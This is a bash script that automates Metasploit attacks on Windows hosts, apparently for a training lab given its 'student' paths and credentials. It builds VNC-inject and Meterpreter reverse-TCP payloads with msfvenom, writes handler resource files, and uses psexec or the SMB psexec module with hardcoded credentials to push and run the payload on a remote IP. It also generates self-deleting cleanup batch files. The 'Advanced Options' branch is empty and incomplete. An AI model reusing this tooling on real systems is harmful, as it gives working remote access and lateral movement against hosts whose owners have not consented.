#! /bin/bash

ip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
#read -e -p "Enter Listener IP: " -i $ip ip
port="4444"
read -e -p "Enter Remote IP: " -i "10.80.100." ip2
port2="4445"



select yn in "VNC Listener" "Meterpreter x86" "Meterpreter x64" "Advanced Options"; do
    case $yn in
        "VNC Listener")
			read -e -p "View Only Mode? (true/false): " -i "true" vo
			fname=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
			fname=$(echo "vnc"$fname)

			msfvenom -p windows/x64/vncinject/reverse_tcp lhost=$ip lport=$port -f exe -o /root/Desktop/$fname.exe
			echo "use exploit/multi/handler" >> /root/.msf4/msfconsole.rc
			echo "setg lhost" $ip >> /root/.msf4/msfconsole.rc
			echo "setg lport" $port >> /root/.msf4/msfconsole.rc
			echo "set payload windows/x64/vncinject/reverse_tcp" >> /root/.msf4/msfconsole.rc
			echo "set ViewOnly" $vo >> /root/.msf4/msfconsole.rc
			
			echo "exploit" >> /root/.msf4/msfconsole.rc
			echo -e "\r\necho del $fname.exe > cleanup.bat" > /root/Desktop/vnc.bat
			echo -e "\r\necho del vnc.bat >> cleanup.bat" >> /root/Desktop/vnc.bat
			echo -e "\r\necho del cleanup.bat >> cleanup.bat" >> /root/Desktop/vnc.bat
			echo -e "\r\npsexec \\\\"$ip2 "-c C:\\users\\student\\desktop\\$fname.exe" >> /root/Desktop/vnc.bat
			msfconsole
			echo cleaning up...
			rm /root/Desktop/$fname.exe
			rm /root/Desktop/vnc.bat
			rm /root/.msf4/msfconsole.rc
			break;;
        "Meterpreter x86")
			msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$ip lport=$port -f exe -o /root/Desktop/meter_drop.exe
			echo "use exploit/multi/handler" >> /root/.msf4/msfconsole.rc
			echo "setg lhost" $ip >> /root/.msf4/msfconsole.rc
			echo "setg lport" $port >> /root/.msf4/msfconsole.rc
			echo "set payload windows/x64/meterpreter_reverse_tcp" >> /root/.msf4/msfconsole.rc
			echo "exploit -j" >> /root/.msf4/msfconsole.rc
			echo "use exploit/windows/smb/psexec" >> /root/.msf4/msfconsole.rc
			echo "set payload windows/meterpreter/reverse_tcp" >> /root/.msf4/msfconsole.rc
			echo "set lhost" $ip >> /root/.msf4/msfconsole.rc
			echo "set lport" $port2 >> /root/.msf4/msfconsole.rc
			echo "set smbpass student">> /root/.msf4/msfconsole.rc
			echo "set smbuser student" >> /root/.msf4/msfconsole.rc
			echo "set rhost" $ip2 >> /root/.msf4/msfconsole.rc
			#echo "set AutoRunScript /root/Desktop/rc.rc" >> /root/.msf4/msfconsole.rc
			echo "exploit" >> /root/.msf4/msfconsole.rc
			echo "upload /root/Desktop/meter_drop.exe meter_drop.exe" >> /root/Desktop/rc.rc
			echo "execute -f meter_drop.exe" >> /root/Desktop/rc.rc
			echo "exit" >> /root/Desktop/rc.rc
			#echo "exit" >> /root/.msf4/msfconsole.rc
			
			msfconsole
			echo cleaning up...
			rm /root/Desktop/meter_drop.exe
			rm /root/.msf4/msfconsole.rc
			rm /root/Desktop/rc.rc
			break;;

	"Meterpreter x64")
			msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$ip lport=$port -f exe -o /root/Desktop/meter_drop.exe
			echo "use exploit/multi/handler" >> /root/.msf4/msfconsole.rc
			echo "setg lhost" $ip >> /root/.msf4/msfconsole.rc
			echo "setg lport" $port >> /root/.msf4/msfconsole.rc
			echo "set payload windows/x64/meterpreter_reverse_tcp" >> /root/.msf4/msfconsole.rc
			echo "exploit" >> /root/.msf4/msfconsole.rc
			echo "psexec \\\\"$ip2 "-c C:\\users\\student\\desktop\\meter_drop.exe" > /root/Desktop/meterpreter.bat
			echo "exit" >> /root/.msf4/msfconsole.rc
			echo "del meter_drop.exe" >> /root/Desktop/meterpreter.bat
			echo "del meterpreter.bat" >> /root/Desktop/meterpreter.bat
			echo -e "\r\necho del meter_drop.exe > cleanup.bat" >> /root/Desktop/meterpreter.bat
			echo -e "\r\necho del meterpreter.bat >> cleanup.bat" >> /root/Desktop/meterpreter.bat
			echo -e "\r\necho del cleanup.bat >> cleanup.bat" >> /root/Desktop/meterpreter.bat
			msfconsole
			echo cleaning up...
			rm /root/Desktop/meter_drop.exe
			rm /root/Desktop/meterpreter.bat
			rm /root/.msf4/msfconsole.rc
			break;;
	"Advanced Options")
			
    esac
done

